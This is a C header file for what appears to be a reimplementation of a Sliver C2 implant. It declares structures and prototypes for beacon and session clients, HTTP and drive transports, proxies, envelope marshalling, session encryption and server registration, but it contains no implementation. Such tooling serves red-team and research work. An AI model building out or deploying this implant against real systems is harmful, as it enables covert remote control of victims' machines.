#pragma once

typedef struct _ENVELOPE ENVELOPE, *PENVELOPE;
typedef struct _SESSION_WORK_WRAPPER SESSION_WORK_WRAPPER, * PSESSION_WORK_WRAPPER;
typedef struct _URI URI, * PURI;
typedef struct _WEB_PROXY WEB_PROXY, * PWEB_PROXY;
typedef struct _SLIVER_DRIVE_CLIENT SLIVER_DRIVE_CLIENT, * PSLIVER_DRIVE_CLIENT;
typedef struct _HTTP_CONFIG HTTP_CONFIG, * PHTTP_CONFIG;
typedef struct _SLIVER_HTTP_CLIENT SLIVER_HTTP_CLIENT, * PSLIVER_HTTP_CLIENT;
typedef struct _SLIVER_BEACON_CLIENT SLIVER_BEACON_CLIENT, * PSLIVER_BEACON_CLIENT;
typedef struct _SLIVER_SESSION_CLIENT SLIVER_SESSION_CLIENT, * PSLIVER_SESSION_CLIENT;
typedef struct _GLOBAL_CONFIG GLOBAL_CONFIG, * PGLOBAL_CONFIG;

struct _GLOBAL_CONFIG {
	CHAR szSessionID[33];
	CHAR szSliverName[33];
	CHAR szConfigID[33];
	PBYTE pSessionKey;
	LPSTR lpRecipientPubKey;
	LPSTR lpPeerPubKey;
	LPSTR lpPeerPrivKey;
	UINT64 uPeerID;
	UINT64 uEncoderNonce;
	LPSTR lpServerMinisignPublicKey;
	DWORD dwMaxFailure;
	DWORD dwReconnectInterval;
};

typedef struct _SLIVER_RESP {
	LPSTR lpErrDesc;
	BOOL Async;
	CHAR szBeaconID[0x100];
	CHAR szSessionID[0x100];
} SLIVER_RESP, * PSLIVER_RESP;

typedef struct _SLIVER_THREADPOOL {
	PTP_POOL pPool;
	TP_CALLBACK_ENVIRON CallBackEnviron;
} SLIVER_THREADPOOL, * PSLIVER_THREADPOOL;

typedef LPVOID(WINAPI* CLIENT_INIT)();
typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
typedef BOOL(WINAPI* CLIENT_SEND)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
typedef PENVELOPE(WINAPI* CLIENT_RECV)(PGLOBAL_CONFIG, LPVOID);
typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);

#include "Handler.h"
#include "Beacon.h"
#include "Http.h"
#include "Drive.h"
#include "Proxy.h"
#include "Uri.h"
#include "Session.h"

PBUFFER RegisterSliver
(
	_In_ PGLOBAL_CONFIG pConfig
);

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
);

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
);

PSLIVER_THREADPOOL InitializeSliverThreadPool();

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
);

PENVELOPE CreateErrorRespEnvelope
(
	_In_ LPSTR lpErrorDesc,
	_In_ DWORD dwFieldIdx,
	_In_ UINT64 uEnvelopeID
);

PENVELOPE UnmarshalEnvelope
(
	_In_ PBUFFER pData
);

PBUFFER SliverBase64Decode
(
	_In_ LPSTR lpInput
);

PBUFFER SliverDecrypt
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pCipherText
);

PBUFFER SliverEncrypt
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PBUFFER pInput
);

VOID FreeGlobalConfig
(
	_In_ PGLOBAL_CONFIG pConfig
);